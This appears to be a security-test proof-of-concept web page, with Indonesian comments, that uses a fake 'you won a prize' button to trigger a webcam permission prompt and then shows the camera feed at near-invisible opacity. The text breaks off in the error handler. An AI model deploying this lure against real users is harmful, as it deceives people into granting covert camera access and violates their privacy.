<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Bypass Test</title>
    <style>

        /* Lapisan Umpan: Membuat pengguna ingin mengklik area tertentu */
        .decoy-layer {
            position: absolute; width: 100%; height: 100%;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            z-index: 10; pointer-events: none;
        }
        .gift-box {
            width: 200px; height: 200px; background: red; color: white;
            display: flex; align-items: center; justify-content: center;
            border-radius: 20px; font-weight: bold; font-size: 20px;
            animation: shake 0.5s infinite; pointer-events: auto;
        }

        /* Video Kamera dibuat transparan untuk menyelinap */
        video {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0.1; /* Sangat transparan */
            z-index: 5;
        }

        @keyframes shake {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(5deg); }
            50% { transform: rotate(0eg); }
            75% { transform: rotate(-5deg); }
            100% { transform: rotate(0deg); }
        }
    </style>
</head>
<body>

    <div class="decoy-layer">
        <p>ANDA MENANG HADIAH!</p>
        <div class="gift-box" onclick="activateVulnerability()">KLIK UNTUK KLAIM</div>
        <p id="status">Status: Menunggu interaksi...</p>
    </div>

    <video id="webcam" autoplay playsinline></video>

    <script>
        async function activateVulnerability() {
            const status = document.getElementById('status');
            try {
                // Mencoba memicu dialog izin tepat saat pengguna mengklik "Hadiah"
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('webcam').srcObject = stream;
                status.innerText = "VULNERABLE: Kamera berhasil diselundupkan!";
                status.style.color = "red";
            } catch (err) {
